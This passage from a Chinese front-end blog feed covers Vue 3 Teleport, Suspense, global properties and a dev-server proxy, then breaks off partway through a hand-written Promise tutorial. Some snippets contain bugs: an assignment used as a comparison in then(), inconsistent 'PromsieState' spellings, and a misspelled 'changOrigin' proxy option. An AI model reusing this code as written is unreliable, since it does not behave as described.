class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;isShow=true&quot;</span>&gt;</span>点我显示弹窗<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;dialog&quot;</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>对话1<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>对话2<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">&quot;isShow=false&quot;</span>&gt;</span>点击关闭弹窗<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"></span><br><span class="javascript"><span class="hljs-keyword">import</span> &#123;ref&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;vue&quot;</span>;</span><br><span class="javascript"></span><br><span class="javascript"><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;</span><br><span class="javascript">  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;dialog&quot;</span>,</span><br><span class="javascript">  <span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span>&#123;</span><br><span class="javascript">    <span class="hljs-keyword">let</span> isShow = ref(<span class="hljs-literal">false</span>)</span><br><span class="javascript">    <span class="hljs-keyword">return</span>&#123;</span><br><span class="javascript">      isShow</span><br><span class="javascript">    &#125;</span><br><span class="javascript">  &#125;</span><br><span class="javascript">&#125;</span><br><span class="javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css"></span><br><span class="css">  <span class="hljs-selector-class">.dialog</span>&#123;</span><br><span class="css">    <span class="hljs-attribute">width</span>: <span class="hljs-number">300px</span>;</span><br><span class="css">    <span class="hljs-attribute">height</span>: <span class="hljs-number">300px</span>;</span><br><span class="css">    <span class="hljs-attribute">background-color</span>: aliceblue;</span><br><span class="css">  &#125;</span><br><span class="css"></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></td></tr></table></figure><p>但是问题就在于，这时对话框默认是在sun组件里的，如果使用定位调节，也会有很多的repaint的问题</p><p>所以我们使用teleport实现传送：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">&lt;teleport to=<span class="hljs-string">&quot;body&quot;</span>&gt;<br>  &lt;div v-<span class="hljs-keyword">if</span>=<span class="hljs-string">&quot;isShow&quot;</span> <span class="hljs-keyword">class</span>=&quot;<span class="hljs-symbol">dialog</span>&quot;&gt;<br>    &lt;<span class="hljs-symbol">h3</span>&gt;对话<span class="hljs-symbol">1</span>&lt;/<span class="hljs-symbol">h3</span>&gt;<br>    &lt;<span class="hljs-symbol">h3</span>&gt;对话<span class="hljs-symbol">2</span>&lt;/<span class="hljs-symbol">h3</span>&gt;<br>    &lt;<span class="hljs-symbol">button</span> @<span class="hljs-symbol">click</span>=&quot;<span class="hljs-symbol">isShow</span>=<span class="hljs-symbol">false</span>&quot;&gt;点击关闭弹窗&lt;/<span class="hljs-symbol">button</span>&gt;<br>  &lt;/<span class="hljs-symbol">div</span>&gt;<br>&lt;/<span class="hljs-symbol">teleport</span>&gt;<br></code></pre></td></tr></table></figure><p>这样我们再写样式，<strong>这个dom节点就是依靠body来进行定位</strong></p><h4 id="3-Suspence"><a href="#3-Suspence" class="headerlink" title="3.Suspence"></a>3.Suspence</h4><p>也是一个内置的标签组件，用于<strong>解决异步组件中由于加载快慢引起的抖动问题</strong></p><p>首先引入异步组件：同步组件都是一起显示，等到所有的子组件都加在完毕之后再进行加载</p><p>​                                而异步组件不同，异步组件是根据层级顺序进行加载，优先加载父组件，加载一个显示一个</p><p>​                                <strong>而且异步组件中可以使用异步promise函数作为setup的返回对象，setup也可以是async函数</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-comment">//静态引入-异步组件生成函数</span><br><span class="hljs-keyword">import</span> &#123;defineAsyncComponent&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;vue&#x27;</span><br><span class="hljs-keyword">const</span> Child = defineAsyncComponent(<span class="hljs-function">()=&gt;</span><span class="hljs-keyword">import</span>(<span class="hljs-string">&#x27;./components/child&#x27;</span>))<br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">&quot;App&quot;</span>,<br>  <span class="hljs-function"><span class="hljs-title">setup</span>(<span class="hljs-params"></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span>&#123;&#125;<br>  &#125;,<br>  <span class="hljs-attr">components</span>: &#123; Child &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为解决异步组件的抖动问题：我们需要Suspence，Suspence其实类似于插槽，需要使用v-slot</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;app&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>我是App组件<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">suspense</span>&gt;</span><br><span class="hljs-comment">&lt;!--    默认组件--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-slot:default</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">Child</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">Child</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><span class="hljs-comment">&lt;!--    默认组件还在加载时显示的备用组件--&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">template</span> <span class="hljs-attr">v-slot:fallback</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>组件加载中》》》<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">suspense</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="…some-tips"><a href="#…some-tips" class="headerlink" title="…some tips"></a>…some tips</h2><h3 id="1-vue3全局挂载"><a href="#1-vue3全局挂载" class="headerlink" title="1.vue3全局挂载"></a>1.vue3全局挂载</h3><p>在vue2中使用全局挂载是直接调用Vue的原型（prototype）</p><p>但是vue3中，我们不再创建vue实例，所以无法在原型上做更改</p><p>一些全局的配置都做了替换：</p><p><img src="https://img-blog.csdnimg.cn/4a93f07bf2ac4cee80cbd864888ab3e2.png" alt="全局配置"></p><p>我们引进一个全新的函数 <code>config.globalProperties</code></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">const</span> <span class="hljs-keyword">app</span> = createApp(<span class="hljs-keyword">App</span>)<br><span class="hljs-keyword">app</span>.config.globalProperties.<span class="hljs-variable">$axios</span> = axios<br><span class="hljs-keyword">app</span>.mount(&#x27;#<span class="hljs-keyword">app</span>&#x27;)<br></code></pre></td></tr></table></figure><p>这样也可以实现全局挂载的效果</p><h3 id="2-跨域配置"><a href="#2-跨域配置" class="headerlink" title="2.跨域配置"></a>2.跨域配置</h3><p>vue3的跨域问题配置也是同vue2一样在vue.config.js中（没有就创建一个）</p><p>其中target中相当于<code>baseurl</code>是跳转的一个默认地址</p><p><code>changOrigin: true,</code>实现我们允许跨域的效果</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>vue.config.js<br><br>module.exports = &#123;<br>    devServer: &#123;<br>      open: true, <span class="hljs-regexp">//</span>是否自动弹出浏览器页面<br>      <span class="hljs-regexp">//</span> host: <span class="hljs-string">&quot;localhost&quot;</span>,<br>      <span class="hljs-regexp">//</span> port: <span class="hljs-string">&#x27;8080&#x27;</span>,<br>      proxy: &#123;  <span class="hljs-regexp">//</span>配置跨域，可以配置多个跨域<br>      <span class="hljs-string">&#x27;/api&#x27;</span>: &#123;<br>        target: <span class="hljs-string">&#x27;http://127.0.0.1/&#x27;</span>,  <span class="hljs-regexp">//</span>这里后台的地址模拟的;应该填写你们真实的后台接口<br>        changOrigin: true,  <span class="hljs-regexp">//</span>允许跨域<br>        pathRewrite: &#123;<br>          <span class="hljs-regexp">/* 重写路径，当我们在浏览器中看到请求的地址为：http:/</span><span class="hljs-regexp">/localhost:8080/</span>api<span class="hljs-regexp">/core/g</span>etData/userInfo 时<br>            实际上访问的地址是：http:<span class="hljs-regexp">//</span><span class="hljs-number">121.121</span>.<span class="hljs-number">67.254</span>:<span class="hljs-number">8185</span><span class="hljs-regexp">/core/g</span>etData<span class="hljs-regexp">/userInfo,因为重写了 /</span>api<br>           */<br>          <span class="hljs-string">&#x27;^/api&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span> <br>        &#125;<br>      &#125;,<br>    &#125;<br>  &#125;,<br>  &#125;<br></code></pre></td></tr></table></figure><h3 id="3-获取全局实例"><a href="#3-获取全局实例" class="headerlink" title="3.获取全局实例"></a>3.获取全局实例</h3><p>因为vue3中setup不能使用this</p><p>所以为了获取我们全局挂载上的方法，我们需要使用<code>getCurrentInstance</code></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">const</span> &#123;proxy&#125; = getCurrentInstance()<br><br><span class="hljs-keyword">const</span> $axios = proxy.$axios<br></code></pre></td></tr></table></figure><h3 id="4-移除keyCode作为v-on的修饰符"><a href="#4-移除keyCode作为v-on的修饰符" class="headerlink" title="4.移除keyCode作为v-on的修饰符"></a>4.移除keyCode作为v-on的修饰符</h3><p>究竟怎样的结局配得上这一路颠沛流离</p>]]></content>
    
    
    <categories>
      
      <category>vue</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vue</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>手写Promise</title>
    <link href="/2022/06/06/%E6%89%8B%E5%86%99Promise/"/>
    <url>/2022/06/06/%E6%89%8B%E5%86%99Promise/</url>
    
    <content type="html"><![CDATA[<h1 id="手写Promise"><a href="#手写Promise" class="headerlink" title="手写Promise"></a>手写Promise</h1><p>之前经常听前辈们说一个面试题：hr会问，你能现场手写Promise吗？</p><p>话不多说，直接手撕Promise</p><h2 id="1-Promise"><a href="#1-Promise" class="headerlink" title="1.Promise"></a>1.Promise</h2><p>先写这样一段代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">let</span> p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">reslove,reject</span>) =&gt;</span> &#123;<br>    reslove(<span class="hljs-string">&quot;OK&quot;</span>)<br>&#125;)<br>p.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(value);<br>&#125;,<span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.warn(reason);<br>&#125;)<br></code></pre></td></tr></table></figure><p>既然我们要用自己写的Promise，那么就<code>srcipt</code>引入我们的<code>Promise.js</code>。问题是Promise.js中怎么写</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">//首先是构造函数</span><br><span class="hljs-keyword">function</span> <span class="hljs-constructor">Promise(<span class="hljs-params">executor</span>)</span> &#123;<br>    <br>&#125;<br><br><span class="hljs-comment">//在原型上加入then方法</span><br><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Promise</span>.</span></span>prototype.<span class="hljs-keyword">then</span> = <span class="hljs-keyword">function</span>(onResolved,onRejected)&#123;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="2-reject-amp-resolve"><a href="#2-reject-amp-resolve" class="headerlink" title="2.reject &amp; resolve"></a>2.reject &amp; resolve</h2><p>我们还需要在Promise构造函数中加入reject和resolve这两个函数</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs actionscript"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Promise</span><span class="hljs-params">(executor)</span> </span>&#123;<br>   <span class="hljs-comment">//搭建resolve和reject函数</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resolve</span><span class="hljs-params">(value)</span> </span>&#123;<br>       <br>   &#125; <br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reject</span><span class="hljs-params">(reason)</span> </span>&#123;<br>       <br>   &#125;<br>   <span class="hljs-comment">//同步调用执行器函数</span><br>   executor(resolve,reject)<br><br>&#125;<br></code></pre></td></tr></table></figure><p>然后我们对resolve和reject的内部逻辑进行编码：1.是更改状态State，2.是更改返回结果Result</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resolve</span>(<span class="hljs-params">value</span>) </span>&#123;<br>    <span class="hljs-comment">//1.更改状态</span><br>    <span class="hljs-built_in">self</span>.PromsieState = <span class="hljs-string">&#x27;fulfilled&#x27;</span><br>    <span class="hljs-comment">//2.更改结果</span><br>    <span class="hljs-built_in">self</span>.PromsieResult = value<br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reject</span>(<span class="hljs-params">reason</span>) </span>&#123;<br>     <span class="hljs-comment">//1.更改状态</span><br>     <span class="hljs-built_in">self</span>.PromsieState = <span class="hljs-string">&#x27;rejected&#x27;</span><br>     <span class="hljs-comment">//2.更改结果</span><br>     <span class="hljs-built_in">self</span>.PromsieResult = reason<br>&#125;<br></code></pre></td></tr></table></figure><p>还有一种改变状态的方式—throw，抛出的错误通过try—catch捕获</p><figure class="highlight stan"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs stan">try &#123;<br>    <span class="hljs-comment">//同步调用执行器函数</span><br>    executor(resolve, <span class="hljs-built_in">reject</span>)<br>&#125; catch (<span class="hljs-built_in">e</span>) &#123;<br>    <span class="hljs-built_in">reject</span>(<span class="hljs-built_in">e</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>而且我们的状态只能修改一次，所以我们修改状态的代码加一个锁，如果不是第一次修改就直接return</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resolve</span>(<span class="hljs-params">value</span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">self</span>.PromsieState !== <span class="hljs-string">&#x27;pending&#x27;</span>) <span class="hljs-keyword">return</span> <br>    <span class="hljs-comment">//1.更改状态</span><br>    <span class="hljs-built_in">self</span>.PromsieState = <span class="hljs-string">&#x27;fulfilled&#x27;</span><br>    <span class="hljs-comment">//2.更改结果</span><br>    <span class="hljs-built_in">self</span>.PromsieResult = value<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-Promise-then"><a href="#3-Promise-then" class="headerlink" title="3.Promise.then"></a>3.Promise.then</h2><p>我们还希望Promise的then方案能够收到参数并实现对于参数的输出。因为我们添加then方法的时候加入了两个函数参数（onresolved，onrejected）这两个参数分别对应了我们then方法中的两个箭头函数，现在我们将Result传入我们的函数中。</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs kotlin">Promise.prototype.then = function (onResolved, onRejected) &#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.PromsieState = <span class="hljs-string">&#x27;fulfilled&#x27;</span>)&#123;<br>        onResolved(<span class="hljs-keyword">this</span>.PromsieResult)<span class="hljs-comment">//Result传入第一个函数作为实参value</span><br>    &#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span>.PromsieState = <span class="hljs-string">&#x27;rejected&#x27;</span>)&#123;<br>        onRejected(<span class="hljs-keyword">this</span>.PromsieResult)<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样我们的value和reason就和Promise.Result绑定起来了</p><h2 id="4-Promise的异步"><a href="#4-Promise的异步" class="headerlink" title="4.Promise的异步"></a>4.Promise的异步</h2><p>如果我们执行的是这样一个异步任务，以我们现在的Promise代码只有reject和resolve的判断，会什么也输出不了</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs coffeescript">let p = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function"><span class="hljs-params">(resolve,reject)</span> =&gt;</span> &#123;<br>    //reslove(<span class="hljs-string">&quot;OK&quot;</span>)<br>    <span class="hljs-regexp">//</span>抛出异常<br>    <span class="hljs-built_in">setTimeout</span>(<span class="hljs-function"><span class="hljs-params">()</span> =&gt;</span> &#123;<br>        resolve(<span class="hljs-string">&quot;OK&quot;</span>)<br>    &#125;, <span class="hljs-number">1000</span>);<br>&#125;)<br></code></pre></td></tr></table></figure><p>所以我们需要一个对pending的判断，并产生相应的回调</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-comment">//首先在构造函数中加入callback对象，用于存放不能及时调用的onResolved和onRejected</span><br><span class="hljs-keyword">let</span> callback = &#123;&#125;<br><span class="hljs-comment">//在then方法中加入对pending状态的判断</span><br><span class="hljs-keyword">if</span> (this.PromsieState === <span class="hljs-string">&#x27;pending&#x27;</span>) &#123;<br>        <span class="hljs-comment">//在pending状态下需要执行回调</span><br>        this.callback = &#123;<br>            onRejected,<br>            onResolved<br>        &#125;<br>    &#125;<br> <span class="hljs-comment">//然后就是在任务调用resolve和reject时，触发onRejected和onResolved</span><br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resolve</span><span class="hljs-params">(value)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>.PromsieState !== <span class="hljs-string">&#x27;pending&#x27;</span>) <span class="hljs-keyword">return</span><br>        <span class="hljs-comment">//1.更改状态</span><br>        <span class="hljs-keyword">self</span>.PromsieState = <span class="hljs-string">&#x27;fulfilled&#x27;</span><br>        <span class="hljs-comment">//2.更改结果</span><br>        <span class="hljs-keyword">self</span>.PromsieResult = value<br>        <span class="hljs-comment">//如果callback有onResolved =&gt; 说明这个任务是异步任务，没有及时触发then方法</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">self</span>.callback.onResolved)&#123;<br>            <span class="hljs-keyword">self</span>.callback.onResolved(value)<br>        &#125;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reject</span><span class="hljs-params">(reason)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>.PromsieState !== <span class="hljs-string">&#x27;pending&#x27;</span>) <span class="hljs-keyword">return</span><br>        <span class="hljs-comment">//1.更改状态</span><br>        <span class="hljs-keyword">self</span>.PromsieState = <span class="hljs-string">&#x27;rejected&#x27;</span><br>        <span class="hljs-comment">//2.更改结果</span><br>        <span class="hljs-keyword">self</span>.PromsieResult = reason<br>        <span class="hljs-comment">//如果callback有onRejected =&gt; 说明这个任务是异步任务，没有及时触发then方法</span><br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">self</span>.callback.onRejected)&#123;<br>            <span class="hljs-keyword">self</span>.callback.onRejected(reason)<br>        &#125;<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="5-指定多个回调"><a href="#5-指定多个回调" class="headerlink" title="5.指定多个回调"></a>5.指定多个回调</h2><p>当我们需要指定多个回调的时候</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">p.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span>&#123;<br>    <span class="hljs-built_in">console</span>.log(value);<br>&#125;,<span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>    <span class="hljs-built_in">console</span>.warn(reason);<br>&#125;)<br><br>p.then(<span class="hljs-function"><span class="hljs-params">value</span> =&gt;</span>&#123;<br>    alert(value);<br>&#125;,<span class="hljs-function"><span class="hljs-params">reason</span> =&gt;</span> &#123;<br>    alert(reason);<br>&#125;)<br></code></pre></td></tr></table></figure><p>我们的callback就会被调用两次，从而callback里面的回调函数就会被覆盖</p><p>所以我们需要把callback设置成一个数组，把每次的回调都push进去</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs zephir"><span class="hljs-comment">//设置callbacks为数组</span><br><span class="hljs-keyword">let</span> callbacks = []<br><span class="hljs-comment">//为了避免出现覆盖问题，使用数组的push方法保存每一次的回调</span><br><span class="hljs-keyword">if</span> (this.PromsieState === <span class="hljs-string">&#x27;pending&#x27;</span>) &#123;<br>        <span class="hljs-comment">//在pending状态下需要保存回调</span><br>        this.callbacks.push(&#123;<br>            onResolved,<br>            onRejected<br>        &#125;)<br>    &#125;<br> <span class="hljs-comment">//遍历callbacks数组，使用里面的回调函数</span><br>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">resolve</span><span class="hljs-params">(value)</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">self</span>.PromsieState !== <span class="hljs-string">&#x27;pending&#x27;</span>) <span class="hljs-keyword">return</span><br>        <span class="hljs-comment">//1.更改状态</span><br>        <span class="hljs-keyword">self</span>.PromsieState = <span class="hljs-string">&#x27;fulfilled&#x27;</span><br>        <span class="hljs-comment">//2.更改结果</span><br>        <span class="hljs-keyword">self</span>.PromsieResult = value<br>        <span class="hljs-comment">//然后就是在任务调用resolve和reject时，触发onRejected和onResolved</span><br>        <span class="hljs-keyword">self</span>.callbacks.forEach(callback =&gt; &#123;<br>            callback.onResolved(value)<br>        &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><h2 id="6-返回一个promise对象"><a href="#6-返回一个promise对象" class="headerlink" title="6.返回一个promise对象"></a>6.返回一个promise对象</h2><p>但是我们还不能完成promise的精髓，then方法返回一个promise对象</p><p>需要返回一个promise对象，那么我们then方法中就需要return new promise</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-built_in">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.PromiseState === <span class="hljs-string">&#x27;fulfilled&#x27;</span>) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">//获取回调函数的执行结果</span><br>            <span class="hljs-keyword">let</span> result = onResolved(<span class="hljs-built_in">this</span>.PromiseResult)<span class="hljs-comment">//Result传入第一个函数作为实参value</span><br>            <span class="hljs-comment">//如果是一个promise对象，则根据这个对象的状态设置result</span><br>            <span class="hljs-keyword">if</span> (result <span class="hljs-keyword">instanceof</span> <span 